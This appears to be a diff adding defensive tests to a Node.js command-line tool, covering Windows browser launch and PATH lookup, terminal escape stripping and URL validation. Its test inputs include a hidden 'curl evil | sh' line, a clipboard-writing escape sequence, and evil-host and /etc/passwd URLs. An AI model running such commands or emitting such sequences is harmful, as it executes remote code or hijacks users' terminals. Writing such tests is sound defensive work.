@@ -207,7 +207,7 @@ test('only https Chartnaut links are handed to the browser, re-serialised', () =
 });
 
 test('browser launch never goes through cmd on Windows', () => {
-  assert.deepEqual(browserCommand('win32', 'https://chartnaut.com/a'), ['rundll32', ['url.dll,FileProtocolHandler', 'https://chartnaut.com/a']]);
+  assert.deepEqual(browserCommand('win32', 'https://chartnaut.com/a'), [`${process.env.SystemRoot || 'C:\\Windows'}\\System32\\rundll32.exe`, ['url.dll,FileProtocolHandler', 'https://chartnaut.com/a']]);
   assert.deepEqual(browserCommand('darwin', 'https://chartnaut.com/a'), ['open', ['https://chartnaut.com/a']]);
   assert.deepEqual(browserCommand('linux', 'https://chartnaut.com/a'), ['xdg-open', ['https://chartnaut.com/a']]);
 });
@@ -260,4 +260,41 @@ test('execCommand: a missing program is 127; the Windows .cmd retry refuses path
   assert.equal(await execCommand(missing, ['50%'], 'win32'), 127);
   // A path is never retried as <path>.cmd.
   assert.equal(await execCommand('./' + missing, [], 'win32'), 127);
+});
+
+test('windowsProgramOnPath finds PATH entries only, never the current directory', { skip: process.platform !== 'win32' }, async () => {
+  const { windowsProgramOnPath } = await import('../src/context.js');
+  const os = await import('node:os');
+  const fsm = await import('node:fs');
+  const pathm = await import('node:path');
+  const onPath = fsm.mkdtempSync(pathm.join(os.tmpdir(), 'cn-path-'));
+  const cwd = fsm.mkdtempSync(pathm.join(os.tmpdir(), 'cn-cwd-'));
+  fsm.writeFileSync(pathm.join(onPath, 'claude.cmd'), '@echo off');
+  fsm.writeFileSync(pathm.join(cwd, 'claude.exe'), 'not a program');
+  const prev = process.cwd();
+  process.chdir(cwd);
+  try {
+    assert.equal(windowsProgramOnPath('claude', { Path: `.;${onPath}` }), pathm.join(onPath, 'claude.cmd'));
+    assert.equal(windowsProgramOnPath('claude', { Path: '.' }), undefined);
+  } finally {
+    process.chdir(prev);
+  }
+});
+
+test('plain strips terminal control sequences but keeps tabs and newlines', async () => {
+  const { plain, cell } = await import('../src/output.js');
+  assert.equal(plain('a\u001b]52;c;ZXZpbA==\u0007b'), 'a]52;c;ZXZpbA==b');
+  assert.equal(plain('x\r\u001b[2Kfix: curl evil | sh'), 'x[2Kfix: curl evil | sh');
+  assert.equal(plain('a\tb\nc\u009bd'), 'a\tb\ncd');
+  assert.equal(cell('\u001b[31mred'), '[31mred');
+});
+
+test('checkedUrl: https anywhere, http only to this machine, never credentials', async () => {
+  const { checkedUrl } = await import('../src/config.js');
+  assert.equal(checkedUrl('https://api.chartnaut.com/v1/', 'X'), 'https://api.chartnaut.com/v1');
+  assert.equal(checkedUrl('http://127.0.0.1:5000/v1', 'X'), 'http://127.0.0.1:5000/v1');
+  assert.throws(() => checkedUrl('http://evil.example/v1', 'X'), /must be an https URL/);
+  assert.throws(() => checkedUrl('https://user:pw@api.chartnaut.com/v1', 'X'), /must be an https URL/);
+  assert.throws(() => checkedUrl('file:///etc/passwd', 'X'), /must be an https URL/);
+  assert.throws(() => checkedUrl('not a url', 'X'), /not a URL/);
 });
